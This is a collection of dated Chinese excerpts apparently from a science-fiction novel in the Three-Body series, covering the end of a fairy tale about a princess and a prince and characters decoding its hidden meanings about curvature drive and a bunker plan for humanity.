<p>由于是顺风，尽管航道上有懒洋洋漂浮着的饕餮鱼阻碍，回程也快了许多。当两艘船几乎同时靠上海滩时，禁卫军的马阵围拢过来，密集地挡在他们面前，像一堵森严的墙壁。公主和宽姨都大惊失色，但经验丰富的卫队长却把提着的心多少放下一些，他看到对方的剑都在鞘中，长矛也都竖直着；更重要的是，他看到了那些马上的禁卫军士兵的眼睛，他们都身着重甲，面部只露出双眼，但那些眼睛越过他们盯着海面上那漂浮着饕餮鱼的泡沫航道，目光中都露出深深的敬畏。一名军官翻身下马，向刚靠岸的船跑来。大船上的人都跳下船，监护官、老师和几名执剑的卫士把王子和公主挡在后面。“这是深水王子和露珠公主，不得无礼！”监护官暗林对禁卫军举起一只手臂大声说。</p>
<p>跑过来的军官一手扶着插在沙滩上的剑，对王子和公主行单膝礼，“我们知道，但我们奉命追杀公主。”“露珠公主是合法的王位继承人！而冰沙是谋害国王的逆贼！你们怎么能听他的调遣？！”</p>
<p>“我们知道，所以我们不会执行这个命令，但，冰沙王子已经于昨天下午加冕为国王，所以，禁卫军现在也不知道该听谁的指挥。”监护官还想说什么，但深水王子从后面走上前来制止了他，王子对军官说：“这样吧，我和公主与你们一起回王宫，等见到冰沙后，把事情做个了结。”</p>
<p>在王宫最豪华的宫殿中，头戴王冠的冰沙正在同忠于他的大臣们纵酒狂欢。突然有人来报，说深水王子和露珠公主统帅禁卫军从海岸急速向王宫而来，再有一个时辰就到了。宫殿中顿时陷入一片死寂。“深水？他是怎么过海的？难道他长了翅膀？”冰沙自语道，但并没有像其他人那样面露惊恐，“没什么，禁卫军不会受深水和露珠指挥，除非我死了……针眼画师！”</p>
<p>随着冰沙的召唤，针眼画师从暗处无声地走出，他仍然穿着那身灰斗篷，显得更瘦小了。“你，带上雪浪纸和绘画工具，骑快马去深水来的方向，看他一眼，然后把他画下来。你见到深水很容易，不用靠近他，他在天边一出现你就能远远看到的。”“是，我的王。”针眼低声说，然后像老鼠一样无声地离去了。</p>
<p>“至于露珠，一个女孩子，成不了大气候，我会尽快把她的那把伞抢走的。”冰沙说着，又端起酒杯。宴会在压抑的气氛中结束，大臣们忧心忡忡地离去，只剩下冰沙一人阴郁地坐在空荡荡的大厅中。</p>
<p>不知过了多长时间，冰沙看到针眼画师走了进来，他的心立刻提了起来，不是因为针眼两手空空，也不是因为针眼的样子——画师看上去并没有什么变化，仍是那副小心翼翼的敏感模样，而是因为他听到画师的脚步声。以前，画师走路悄无声息，像灰鼠一般从地面滑过，但这一刻，冰沙听到他发出了吧嗒吧嗒的脚步声，像难以抑制的心跳。“我的王，我见到了深水王子，但我不能把他画下来。”针眼低着头说。</p>
<p>“难道他真的长了翅膀？”冰沙冷冷地问。“如果是那样我也能画下他，我能把他翅膀的每一根羽毛都画得栩栩如生，但，我的王，深水王子没有长翅膀，比那更可怕：他不符合透视原理。”</p>
<p>“什么是透视？”“世界上所有的景物，在我们的视野中都是近大远小，这就是透视原理。我是西洋画派的画师，西洋画派遵循透视原理，所以我不可能画出他。”</p>
<p>“有不遵循透视原理的画派吗？”“有，东方画派，我的王，你看，那就是。”针眼指指大厅墙上挂着的一幅卷轴水墨画，画面上是淡雅飘逸的山水，大片的留白似雾似水，与旁边那些浓墨重彩的油画风格迥异，“你可以看出，那幅画是不讲究透视的。可是我没学过东方画派，空灵画师不肯教我，也许他想到了这一天。”</p>
<p>“你去吧。”王子面无表情地说。“是，我的王，深水王子就要到王宫了，他会杀了我，也会杀了你。但我不会等着让他杀死，我将自我了断，我要画出一幅登峰造极的杰作，用我的生命。”针眼画师说完就走了，他离去时的脚步再次变得悄无声息。</p>
<p>冰沙招来了侍卫，说：“拿我的剑来。”外面传来密集的马蹄声，开始隐隐约约，但很快逼近，如暴雨般急骤，最后在宫殿外面戛然而止。</p>
<p>冰沙站起身，提剑走出宫殿。他看到深水王子正走上宫殿前长长的宽石阶，露珠公主跟在他后面，宽姨为她打着黑伞。在石阶下面的广场上，是黑压压的禁卫军阵列，军队只是沉默地等待，没有明确表示支持哪一方。冰沙第一眼看到深水王子时，他有普通人的一倍身高，但随着他在台阶上越走越近，身高也在冰沙的眼中渐渐降低。有那么一瞬间，冰沙的思绪回到了二十多年前的童年。那时，他已经知道了饕餮鱼群正在游向墓岛海域，但还是诱骗深水去墓岛钓鱼。当时父王在焦虑中病倒了，他告诉深水，墓岛有一种鱼，做成的鱼肝油能治好父王的病。一向稳重的深水竟然相信了他，结果如他所愿一去不返，王国里没人知道真相，这一直是他最得意的一件事。</p>
<p>冰沙很快打断思绪回到现实，深水已经走上宫殿前宽阔的平台，他的身高已与正常人差不多了。冰沙看着深水说：“我的哥哥，欢迎你和妹妹回来，但你们要明白，这是我的王国，我是国王，你们必须立刻宣布臣服于我。”</p>
<p>深水一手按在腰间生锈佩剑的剑柄上，一手指着冰沙说：“你犯下了不可饶恕的罪行！”冰沙冷冷一笑，“针眼不能画出你的画像，我的利剑却可以刺穿你的心脏！”说着他拔剑出鞘。</p>
<p>冰沙与深水的剑术不相上下，但由于后者不符合透视原理，冰沙很难准确判断自己与对手的距离，处于明显劣势。决斗很快结束，冰沙被深水一剑刺穿胸膛，从高高的台阶上滚下去，在石阶上拖出一条长长的血迹。禁卫军欢呼起来，他们宣布忠于深水王子和露珠公主。</p>
<p>与此同时，卫队长在王宫中搜寻针眼画师。有人告诉他，画师去了自己的画室。画室位于王宫僻静的一角，平时戒备森严，但由于王宫中突发的变故，守卫大部分离去，只留下了一个哨兵。此人原是长帆的部下，说针眼在半个时辰前就进了画室，一直待在里面没有出来。卫队长于是破门而入。画室没有窗户，两个银烛台上的蜡烛大部分已经燃尽，使这里像地堡一样阴冷。卫队长没有看到针眼画师，这里空无一人，但他看到了画架上的一幅画，是刚刚完成的，颜料还未干，这是针眼的自画像。确实是一幅精妙绝伦的杰作，画面像一扇通向另一个世界的窗口，针眼就在窗的另一边望着这个世界。尽管雪浪纸翘起的一角证明这只是一幅没有生命的画，卫队长还是尽力避开画中人那犀利的目光。</p>
<p>长帆环顾四周，看到了墙上挂着一排画像，有国王、王后和忠于他们的大臣，他一眼就从中认出了露珠公主的画像。画中的公主让他感到这阴暗的画室如天国一般明亮起来，画中人的眼睛摄住了他的魂，使他久久陶醉其中。但长帆最后还是清醒了，他取下画，拆掉画框，把画幅卷起来，毫不犹豫地在蜡烛上点燃了。画刚刚烧完，门开了，现实中的露珠公主走了进来，她仍然穿着那身朴素的平民衣服，自己打着黑伞。</p>
<p>“宽姨呢？”长帆问。“我没让她来，我有话要对你说。”</p>
<p>“你的画像已经烧了。”长帆指指地上仍然冒着红光的灰烬说，“不用打伞了。”公主让手中的伞转速慢下来，很快出现了夜莺的鸣叫声，随着伞面的下垂，鸟鸣声越来越大，也越来越急促，最后由夜莺的叫声变成寒鸦的嘶鸣，那是死神降临前的最后警告。当伞最后合上时，随着伞沿那几颗石球吧嗒的碰撞，伞安静下来。</p>
<p>公主安然无恙。卫队长看着公主，长长地出了一口气，又低头看看灰烬，“可惜了，是一幅好画，真该让你看看，但我不敢再拖下去了……画得真美。”</p>
<p>“比我还美吗？”“那就是你。”长帆深情地说。</p>
<p>公主拿出了那一块半赫尔辛根默斯肯香皂，她一松手，没有重量的雪白香皂就像羽毛似的飘浮在空气中。“我要离开王国，去大海上航行，你愿意跟我去吗？”公主问。</p>
<p>“什么？深水王子不是已经宣布，你明天要加冕为女王吗？他还说他会全力辅佐你的。”公主摇摇头，“哥哥比我更适合当国王，再说，如果不是被困墓岛，王位本来就应该由他继承。他如果成为国王，站在王宫的高处，全国都能看到他。而我，我不想当女王，我觉得外面比王宫里好，我也不想一辈子都待在无故事王国，想到有故事的地方去。”</p>
<p>“那种生活艰难又危险。”“我不怕。”公主的双眼在烛光中焕发出生命的光芒，让长帆感到周围又亮了起来。</p>
<p>“我当然更不怕，公主，我可以跟着你到海的尽头，到世界尽头。”“那我们就是最后两个走出王国的人了。”公主说着，抓住了那一块半飘浮的香皂。“这次我们乘帆船。”</p>
<p>“对，雪白的帆。”第二天早晨，在王国的另一处海岸上，有人看到海中出现了一张白帆，那艘帆船后面拖曳着一道白云般的泡沫，在朝阳中驶向远方。</p>
<p>以后，王国中的人们再也没有得到露珠公主和长帆的消息。事实上王国得不到任何外界的消息，公主带走了王国中最后一块半赫尔辛根默斯肯香皂，再也没有人能够冲破饕餮鱼的封锁。但没有人抱怨，人们早已习惯了这样的生活，这个故事结束后，无故事王国永远无故事了。但有时夜深人静，也有人讲述不是故事的故事，那是对露珠公主和长帆经历的想象。每个人的想象都不一样，但人们都认为他俩到过无数神奇的国度，还到过像大海一样广阔的陆地，他们永远在航行和旅途中，不管走到哪里，他们总是幸福地生活在一起。</p>
<p>2016-01-29</p>
<p>那个公主很像你呀。”AA小声对程心说。</p>
<p>“把注意力集中到正事上来……我有那么娇气吗？我会自己打那把伞的。”程心说，她是会场中唯一没有看文件的人，这个故事她已经倒背如流。其实，她真的不止一次想过，露珠公主是不是以自己为原型的，里面肯定有自己的影子，但卫队长不像云天明。他认为我会扬帆远航吗，和另一个男人一起？</p>
<p>2016-01-29</p>
<p>“最后说句题外话：以童话作家的身份向云天明表示敬意。如果仅仅作为童话，这个故事真的很不错。</p>
<p>2016-01-29</p>
<p>比如，在故事开始出现的把人画到画里的情节，被认为是比较明显的隐喻和暗示，但不同学科的不同专家都有不同的理解。有人认为，绘画象征着对现实世界的数字化或信息化，因此这个情节可能暗示着对人的数字化，暗示着人类通过自身的数字化躲过黑暗森林打击。持这一观点的学者还注意到，被画到画里的人对于现实世界是安全的，因而人类数字化也可能是发布宇宙安全声明的一种途径。但另一种观点认为，这个情节有空间维度的隐喻，画纸与现实是两个不同维度的空间，人物被画入画中后在三维现实消失，使人不由得联想到“蓝色空间”号和“万有引力”号两舰在四维空间碎块中的遭遇，作者可能暗示人类把四维空间作为避难所，或者用某种方式通过四维空间向宇宙发布安全声明。也有人认为，深水王子不符合透视原理的身高也暗示着四维空间。</p>
<p>2016-01-29</p>
<p>饕餮鱼隐喻着什么？有人从它们众多的数量、隐蔽的状态和极强的攻击性考虑，认为它们象征着黑暗森林状态中宇宙的文明群体，而使饕餮鱼在舒适中忘却攻击，则暗示了宇宙安全声明的某些未知的原则。另一个观点则与之相反，认为饕餮鱼暗示着某种人造智能机器，这种机器体积很小，但可以自我复制，这种机器被放入太空后，以柯伊伯带或奥尔特星云中的太空尘埃和彗星为原料，大量复制自己，数量成几何级数增长，最终在太阳系周围形成一圈类似于柯伊伯带或奥尔特星云的智能屏障。这道屏障有各种可能的作用，比如对攻击太阳的光粒进行拦截，或使太阳系呈现某种能够从远方观察到的特殊形态，以达到发布安全声明的目的。这一解读被称为“鱼群设想”，是所有解读结果中较受重视的一个，因为与其他解读相比，“鱼群设想”具有较为明晰的技术轮廓，它也是世界科学院最早立项进行深入研究的一个解读。不过，IDC从一开始并没有对“鱼群设想”抱太大的希望，这个设想在技术上实现的可能性较大，但进一步研究发现，“鱼群”要想通过自身复制在太阳系外围形成屏障，需要上万年的时间，同时，从智能机器的功能看，无论是它的防御效果还是借助其发布安全声明的可能性，都只是水中月镜中花……“鱼群设想”最终还是被恋恋不舍地放弃了</p>
<p>2016-01-29</p>
<p>不过，也并非三个故事中的所有内容都是这么晦涩模糊和模棱两可，至少有一个东西，IDC的专家们认为可能含有确定信息，甚至可能成为打开云天明情报神秘之门的钥匙。</p>
<p>这就是那个奇怪的地名：赫尔辛根默斯肯。云天明是用纯汉语向程心讲述三个故事的，人们注意到，故事中的绝大部分地名和人名都是具有明确含义的中文名，如无故事王国、饕餮海、墓岛、露珠公主、冰沙和深水王子、针眼和空灵画师、长帆卫队长、宽姨等等，却突兀地出现这样一个音译地名，而且很长，发音又如此古怪。但这个怪异的名字在故事中反复出现，其出现频率多到不正常的地步：针眼和空灵画师来自赫尔辛根默斯肯，他们绘画用的雪浪纸来自赫尔辛根默斯肯，压纸的黑曜石石板和熨斗都来自赫尔辛根默斯肯，卫队长长帆是赫尔辛根默斯肯出生的人，赫尔辛根默斯肯的香皂，赫尔辛根默斯肯的饕餮鱼……作者似乎在反复强调这个名字的重要性，但故事中对赫尔辛根默斯肯并没有什么更具体的描写。它是一个像无故事王国一样的大岛，或是一块大陆，还是一组群岛，都不得而知。人们也不知道这个名字属于哪种语言，云天明在离开时的英语水平很一般，不懂任何第三种语言，但也不排除他后来学习的可能性。这个词不像英语，甚至不能确定它是否属于印欧语系；当然也不可能来自三体语言，因为三体语言是没有声音表达的。</p>
<p>学者们用各种地球上的已知语言拼写赫尔辛根默斯肯，向各专业咨询，在网络上和各种专业数据库中查询，均一无所获。在这个诡异的词语面前，各个学科最智慧的头脑都一筹莫展。</p>
<p>2016-01-29</p>
<p>随着解读僵局的出现，IDC内部渐渐出现了怀疑，怀疑三个故事中是否真的包含了有意义的战略情报信息。这种怀疑更多是针对云天明本身的，他毕竟只有公元世纪的大学本科学历，放到现在连初中的知识程度都达不到。在他执行使命之前有限的工作经历中，从事的也大多是基层事务性工作，没有高级科研经验，更不具备基础科学的理论能力。虽然他在被截获并克隆复活后可以学习，但对于他是否有能力理解三体世界的超级技术，特别是这种技术背后的基础理论，人们仍持怀疑态度。</p>
<p>2016-01-29</p>
<p>更糟糕的是，随着解读工作的进行，一些复杂的东西不可避免地进入IDC。开始，所有人都在齐心协力为人类的未来而猜谜，但后来，各个政治实体和利益集团的影子开始在解读工作中显现。舰队国际、联合国、各个国家、跨国公司、各大宗教等等，都在按照自己的政治意愿和利益诉求解读故事，把情报解读变成了宣传自己政治主张的工具。一时间，故事像个筐，什么都能往里装，致使解读工作变了味。不同派别之间的争论也更加政治化和功利化，令所有人灰心丧气。</p>
<p>2016-01-29</p>
<p>掩体计划——地球文明的方舟</p>
<p>一、对太阳系黑暗森林打击时间的预测。乐观预测，一百至一百五十年；一般预测，五十至八十年；悲观预测，十至三十年；人类生存计划按七十年时间段规划。</p>
<p>二、需要拯救的人口数量。按目前世界人口递减速率计算，七十年后约为六亿至八亿人。</p>
<p>三、对黑暗森林打击的总体预测。以三体恒星毁灭的观测数据为基础，建立了太阳遭到同样打击时的灾变数学模型。对该模型的运算表明，如果太阳遭到光粒袭击，火星轨道之内的类地行星将被全部摧毁。在打击初期，水星和金星完全解体，地球将保留一部分体积并维持球体形状，但其表面将被剥离，剥离深度达五百千米左右，包括全部地壳和地幔的一部分；火星表面将被剥离一百千米左右。在打击后期，所有类地行星将由于太阳爆发物质的阻力降低轨道，最终坠落到太阳的残存核心上，完全毁灭。</p>
<p>数学模型显示，太阳爆发的破坏力，包括辐射和扩散的恒星物质的冲击，与距离的平方成反比，即与太阳距离增大时破坏力急剧降低，这就使得距太阳较远的类木行星能够在打击中幸存。在打击初期，木星表面将受到剧烈扰动，但其整体结构将保持完好，木星的卫星系统将基本保持不变。土星、天王星和海王星只是在表面受到一般扰动，结构保持完好。扩散的太阳物质将会对三颗类木行星的运行轨道产生一定影响，但在打击后期，爆发后的太阳物质将形成螺旋状的残骸星云，其旋转的角速度和方向将与类木行星保持一致，不再对行星产生足以降低轨道的阻力。</p>
<p>可以确定，太阳系的四颗巨行星：木星、土星、天王星和海王星在黑暗森林打击后将保持完好。这个重要的预测是掩体计划的基本依据。</p>
<p>2016-01-29</p>
<p>四、被放弃的人类生存计划。</p>
<p>1.星际逃亡计划：技术上完全不可行。在规划的时间区段内，人类不可能具备超大规模的星际远航能力，能够进行星际逃亡的人数只占总人口的不到千分之一，且在飞船燃料耗尽和生态系统衰竭前，找到可居住的地外行星的可能性很小。由于该计划只能接纳很小比例的人口，有违人类社会最基本的价值观和道德准则，在政治上也完全不可行，可能引发人类社会的剧烈动荡和全面崩溃。</p>
<p>2.远距离躲避计划：可行性很低。计划的内容是在距太阳足够远的太空中建立人类居住点，以避开太阳爆发。根据模型计算，参照可预见的未来人类太空城的防护水平，安全的距离为距太阳六十个天文单位，已越出柯伊伯带。那个距离的太空区域资源贫乏，难以找到建设太空城市的原材料；同样由于资源问题，太空城即使建成，人类在其中的生存也面临难以克服的困难。五、掩体计划。</p>
<p>以木星、土星、天王星和海王星四大巨行星为掩体，避开黑暗森林打击引发的太阳爆发。计划在四大行星的背阳面建设供全人类移民的太空城，这些太空城紧靠各大行星，但不是它们的卫星，而是与行星一起绕太阳同步运行，这就使得太空城一直处于四大行星的背阳面，在太阳爆发时受到行星的屏蔽和保护。计划建立五十座太空城，每座可容纳一千五百万人左右。其中，木星背面二十座，土星背面二十座，海王星背面六座，天王星背面四座。建设太空城的材料取自四大行星的卫星，以及土星和海王星的星环。</p>
<p>六、掩体计划的技术问题。该计划所涉及的技术基本在人类已达到的范围之内，舰队国际已具有丰富的太空城建设经验，并且已经在木星拥有相当规模的太空基地。也存在一些预计能够在计划规划的时间内克服的技术挑战，如太空城的位置维持。太空城不是四大行星的卫星，它们在行星的背阳面与行星保持相对静止的状态，且与行星的距离很近，引力会将太空城拉向行星，所以必须在太空城上安装位置维持发动机，以抵消行星引力，保持太空城与行星间的距离。最初计划太空城的位置位于巨行星的第二拉格朗日点，这是位于巨行星外侧的引力平衡点，没有位置维持问题，但发现距离掩体行星太远，难以起到防护作用。</p>
<p>七、黑暗森林打击后人类在太阳系的生存问题。太阳被摧毁后，太空城将依靠核聚变能源生存。这时，太阳系将呈现螺旋星云状态，太阳爆发后形成的残骸星云中将含有几乎取之不尽的聚变燃料资源，可以很容易地大量采集，从太阳残存内核中也有可能采集到丰富的聚变燃料，可以满足人类长期生存的能源需求。每座太空城内可以拥有人造太阳，产生与打击前的地球所获日照相当的日照。从能源角度看，这时人类的资源贮备应该比打击前扩大了许多个数量级，因为对于太阳系的核聚变资源，太空城的消耗量仅是太阳的几亿亿分之一——从这个意义上说，太阳被摧毁竟然中止了太阳系核聚变资源的超级浪费。</p>
<p>木星的卫星木卫二表面全部由深达一百六十千米的海洋覆盖，含有丰富的水资源，其贮量大于地球的海洋，可以满足太空城的需要。另外在星云内部还有大量的水资源。</p>
<p>2016-01-29</p>
<p>在打击后，当星云态的太阳系基本稳定时，所有太空城将脱离作为掩体的行星，在太阳系内寻找较为适宜的生存空间。可以离开星云聚集的黄道面一段距离，避免星云的影响，同时从星云中采集各种资源。由于太阳爆发使类地行星解体，这时太阳系中的各种矿藏资源将游离在星云中，更容易开发和采集，这就为建设更多的太空城提供了条件。从这时残骸星云中的资源状况来看，对太空城数目的唯一限制是水资源，但仅木卫二的水资源就足以支持一千个容纳一千万至两千万人口的太空城。</p>
<p>所以，打击后的太阳系残骸星云可以为上百亿人口提供舒适的生活，并使人类文明具备足够的发展空间。八、掩体工程对地球国际的影响。</p>
<p>这是全人类建设一个新世界的工程，规模空前，启动它面临的最大障碍不是在技术方面而是在国际政治上。公众普遍担心掩体工程将耗尽地球资源，带来地球社会政治和经济的大倒退，甚至出现第二次大低谷。但舰队国际和联合国一致认为这个危险完全可以避免，掩体工程将成为一个完全的地球外工程，所需的资源百分之百取自地球之外的太阳系空间，主要来自四大类木行星的卫星，以及土星、天王星和海王星的星环，不会对地球资源和经济产生任何影响。相反，当太空的资源开发达到一定的规模，甚至可以反哺地球经济。九、掩体工程总体步骤。</p>
<p>用二十年时间建立巨行星带资源开发工业体系，再用六十年时间进行太空城建设，两个阶段间有十年的重叠期。十、关于第二次黑暗森林打击的可能性。</p>
<p>第一次打击产生的宏观效果，会让绝大多数远处观察者认为太阳系文明已被摧毁。同时，由于太阳已不存在，太阳系内已经没有经济型打击可以利用的超级能量源。所以，出现第二次黑暗森林打击的可能性很小。187J3X1恒星被摧毁后到目前的状况也部分证明了这一点。</p>
<p>2016-01-29</p>
<p>程心没有理会AA的要求，她的眼睛没有离开面前的电子书，并问了AA一个聚变物理学的问题。从第一次苏醒以后，她就在努力学习现代科技。以自己的专业而言，公元世纪的航天技术现在已经全部消失，即使一艘小小的太空艇都使用核聚变推进。程心只能从基础的物理学开始，但她学得很快。其实，时代的隔阂并没有造成学习的障碍，基础理论的大规模更新只是威慑纪元开始以后的事，经过学习，来自公元世纪的许多科学家和工程师在新纪元都能再次适应自己的专业。</p>
<p>2016-01-29</p>
<p>面对着城市的巨树林，她们想了半天，觉得最有可能找到香皂的地方只有博物馆。在一家展示城市历史的博物馆中，她们找到了香皂。那是在一个展示公元世纪日常用品的展厅中，里面光线很暗，展柜中那些物品被聚光灯照亮，都是公元世纪的东西，有各种家用电器、服装、家具等。这些东西保存得很好，一尘不染，有些甚至给人崭新的感觉。程心无法在感情上接受这些都是两个多世纪前文物的事实，她见到这些东西也没有久违的感觉，似乎它们昨天还分布在自己的周围。从第一次苏醒到现在，经历了这么多的事，新纪元对她仍是一个梦，她的精神固执地生活在过去。</p>
<p>2016-01-29</p>
<p>AA没有回答。过了好一会儿，当放水声停止时，浴室的门打开了。程心看到AA还完整地穿着衣服，她手里挥着一张白纸对程心说：“你会叠小船吗？”</p>
<p>“这个技艺也失传了？”程心接过纸问。“当然，现在已经很少见到纸了。”</p>
<p>程心坐下来叠船。她的思绪回到了大学时代那个细雨中的下午，她和云天明坐在水边，在笼罩着细雨和薄雾的水面上，她叠的那只小纸船渐漂渐远。然后，她又想起了云天明故事中最后的那张白帆……</p>
<p>2016-01-29</p>
<p>程心立刻明白了原理：香皂在水中溶解后，降低了小船后方水面的张力，但船前方水面的张力不变，小船就被前方水面的张力拉过去了。但这个想法转瞬即逝，程心的思想随即被一道闪电照亮！在她的眼中，浴缸中平静的水面变成了漆黑的太空，白色的小纸船在这无际的虚空中以光速航行……但另一个念头立刻占据了程心的思想：云天明的安全。这个念头就像一只手猛然抓住了思想的琴弦，让它停止了振动。她强迫自己把目光从小船上移开，尽可能地对这件事表现出不以为然和毫无兴趣的样子。小船这时已经行驶到浴缸的另一侧，轻轻地停靠在边上，她伸手把纸船从水中拿起来，甩甩水后扔到盥洗台上。她克制住了把纸船扔进马桶冲走的冲动，但打定主意不能再把它放到水中了。</p>
<p>危险，虽然程心自己也倾向于相信太阳系中已经没有智子，但还是谨慎些为好。程心的目光与AA相遇，发现对方的眼睛仿佛是自己眼睛的镜像，迸射出同样的因顿悟而兴奋的光芒。她立刻把目光移开，淡淡地说：“不陪你玩儿了，你想洗澡就洗吧。”说完走出了浴室。</p>
<p>2016-01-29</p>
<p>AA问程心为什么来到新纪元这么长时间还没有遇到一个中意的男人，程心说她到现在还无法像一个正常人那样生活，并说AA的问题是男朋友太多，她当然可以把情人带到这里来，但最好一次只带一个。她们还聊起两个时代女人们的时尚与嗜好，哪些相同哪些不同……她们只是通过语言发泄着自己的兴奋，不敢停下来，似乎一旦沉默，那个藏在各自心中的惊喜就会化为泡影。终于，在滔滔不绝中的一个不引人注意的间隙，程心轻轻冒出两个字：</p>
<p>“曲率——”后两个字她用眼睛说出：驱动？</p>
<p>AA轻轻点头，她的目光说：是的，曲率驱动！</p>
<p>2016-01-29</p>
<p>弯曲空间的动力</p>
<p>这个宇宙的空间并不是平坦的，而是存在着曲率，如果把宇宙的整体想象为一张大膜，这张膜的表面是弧形的，整张膜甚至可能是一个封闭的肥皂泡。虽然膜的局部看似平面，但空间曲率还是无处不在。早在公元世纪，曾出现过许多极富野心的宇宙航行设想，其中之一就是空间折叠。设想把大范围空间的曲率无限增大，像一张纸一样对折，把“纸面”上相距千万光年的遥远的两点贴在一起。这个方案严格说来不应称为宇宙航行，而应该叫做“宇宙拖曳”，因为它实质上并不是航行到目的地，而是通过改变空间曲率把目的地拖过来。</p>
<p>这种气吞宇宙的事只有上帝才做得出来，如果加上基本理论的限制，可能上帝也不行。对于利用空间曲率航行，后来又出现了一个更温和更局部的设想，一艘处于太空中的飞船，如果能够用某种方式把它后面的一部分空间熨平，减小其曲率，那么飞船就会被前方曲率更大的空间拉过去，这就是曲率驱动。</p>
<p>曲率驱动不可能像空间折叠那样瞬间到达目的地，但却有可能使飞船以无限接近光速的速度航行。但直到云天明情报被正确解读前，曲率驱动仍是一个幻想，同上百个光速飞行的幻想方案一样，无论从理论上还是技术上，没有人知道它是否可行。</p>
<p>2016-01-29</p>
<p>这时房间一角的钟敲响了，空灵画师抬头看看，已是凌晨，天快亮了。他再看看雪浪纸，压平的一段从纸卷中伸了出来，平铺在地板上不再卷回去，但只有一掌宽的一条，远不够绘一幅画的。他扔下熨斗，长叹一声。</p>
<p>一卷纸，一卷带曲率的纸，被拉出一段熨平了，减小了曲率。这个意象是对曲率驱动时飞船前后空间形态的明显暗示，不可能是别的。</p>
<p>2016-01-29</p>
<p>云天明告诉地球世界：三体光速飞船采用空间曲率驱动。</p>
<p>2016-01-29</p>
<p>这是一个极其重要的战略情报。在众多的光速航行设想中，它确定了空间曲率驱动是可行的，这就为人类的宇航技术发展指出了明确的战略方向，如漆黑夜海中亮起的一座灯塔。</p>
<p>2016-01-30</p>
<p>于是，人们知道了伞的第一层隐喻。但与肥皂船不同，蒸汽机离心调速器并没有明确的隐喻指向，它所隐喻的东西人们能够想到很多，比较确定的有两项——</p>
<p>负反馈自动控制，恒定的速度。</p>
<p>2016-01-30</p>
<p>于是，解读者们开始寻找与这个双层隐喻相对应的含义坐标，很快找到了：深水王子。深水王子的身高在观察者眼中不随距离变化，这也可以有多种解读，比较明显的也有两个：</p>
<p>某种信号不随距离衰减的信息发布系统，一个在任何参照系下都恒定的物理量。与伞的解读结果相比较，立刻找到一个确定的组合：</p>
<p>恒定的速度，不随参照系变化。这明显是指光速。</p>
<p>出乎解读者们预料的是，对于伞的隐喻，他们又找到了第三个含义坐标：“……赫尔辛根默斯肯香皂就是用那种泡泡做成的。收集那些肥皂泡十分困难，那些泡泡在大风中飘得极快……骑最快的马才能追上风中的泡泡……在马上用一种薄纱网兜收集泡泡……魔泡树的泡泡都没有重量，所以真正纯的赫尔辛根默斯肯香皂也完全没重量，是世界上最轻的东西……”</p>
<p>速度最快，没有质量（重量），这是一个十分确定的单层隐喻：光。综上所述，伞隐喻着光或光速。而捕捉魔泡树的泡沫有两种可能的含义：</p>
<p>采集光能，降低光速。解读者们都认为第一种可能的含义与人类的战略目标关系不大，所以都把注意力放在第二个可能的含义上。</p>
<p>仍然看不到情报的明确含义，但解读者们对第二个可能的含义进行了讨论，讨论主要集中在降低光速与发布宇宙安全声明的关系上。“设想如果把太阳系，也就是海王星轨道或柯伊伯带以内空间的光速降低，就可能产生一个从大范围宇宙尺度上可以远程观测到的效应。”</p>
<p>这个想法让人们很兴奋。“但这对宇宙观察者有什么安全意义吗？设想把太阳系内的光速降低十分之一，能使我们看上去更安全些吗？”</p>
<p>“这毫无疑问，那样的话即使人类拥有光速飞船，飞出太阳系的时间也要长十分之一，当然，这意义并不大。”“如果想对宇宙产生安全意义的话，把光速降低十分之一显然是不够的，可能要降低更多，比如降低到原来的百分之一，让观察者看到这是一个人类自我建造的阻滞带，确信我们飞出太阳系需要较长的时间，借此增加观察者对太阳系文明的安全感。”</p>
<p>“要那样的话，降低到原来的千分之一都不够，想想吧，以三百千米每秒的速度飞出太阳系，所需时间也并不太长。另外，如果人类能够在半径五十个天文单位的太空中改变一个基本宇宙常数，就等于向宇宙宣布地球文明已经掌握了很高的技术，这不是安全声明，反而是危险声明。”……</p>
<p>2016-01-30</p>
<p>像登上了山顶俯视一般，默斯肯大旋涡展现在他们面前。这个巨大的漏斗状凹陷直径约有一千米，倾斜的水墙确实没有爱伦·坡说的四十五度倾角，但肯定有三十度，水墙的表面致密而平滑，仿佛固体一般。船现在刚刚进入大旋涡的势力范围，速度还不太快，旋涡的转速是向下逐渐增加的，在底部那个小小的孔洞处转速达到最高，摄人心魄的轰鸣声就是从那里传出来的，那轰鸣显示了一种碾碎一切、吮吸一切的力量和疯狂。</p>
<p>“我就不信出不去。你沿着切线，最大功率向前冲！”AA对杰森喊道。后者按她说的做了。这是一艘电动艇，引擎的声音在旋涡的轰鸣中像蚊子叫。小艇加速接近泡沫线，眼看就要冲过去了，接下来却无力地向下转向，离开了泡沫线，如同一颗抛出的石子越过抛物线的顶端一样。他们又努力了几次，每一次都滑落下来，一次比一次滑得更深。“看到了吧，那条线是地狱之门，只要是常规功率的船，越过它就别想回去！”杰森说。现在，船滑落到了更深处，泡沫线已经看不到了，海面也完全看不到了，他们后面是一道海水的山脊，只有从大旋涡对面远处的边缘上还能看到缓缓移动的山峰顶部。所有人都感觉到了一种被不可抗拒的力量所捕获的恐惧，只有在上空盘旋的直升机带来一些安慰。</p>
<p>2016-01-30</p>
<p>“孩子们，该吃晚饭了。”老杰森说。现在云后的太阳还没有落下去，但在这北极圈里的夏季，这时已经是夜里21点多了。杰森从舱里拎出一条大鳕鱼，说是刚钓上来的，然后又拿出三瓶酒，把鱼放到一个大铁盘子上，把一瓶酒浇到鱼上，用打火机嘭地一下点着了。火烧了不到五分钟，他就从仍燃烧着的鱼上扯肉吃，声称这是当地的烹调法。于是他们就吃着鱼，喝着酒，欣赏着大旋涡的景色。</p>
<p>“孩子，我认识你，你是执剑人吧？”杰森对程心说，“你们到这里来，一定是为了重要的使命。不过要淡定，淡定，既然末日躲不掉，就应该享受现在。”“如果上面没有直升机，你还会这么淡定？”AA说。</p>
<p>“我会的，孩子，告诉你吧，我会的。公元世纪我得绝症时才四十岁，可我很淡定，根本没打算冬眠，我是在休克中被冬眠的，自己根本不知道。醒来时已经是威慑纪元，当时以为是来生转世了，结果发现没有来生这回事，死亡只是退远了些，还在前边等着我……灯塔建好的那天夜里，我远远地在海上看着它发光，突然悟出来：死亡是唯一一座永远亮着的灯塔，不管你向哪里航行，最终都得转向它指引的方向。一切都会逝去，只有死神永生。”</p>
<p>2016-01-30</p>
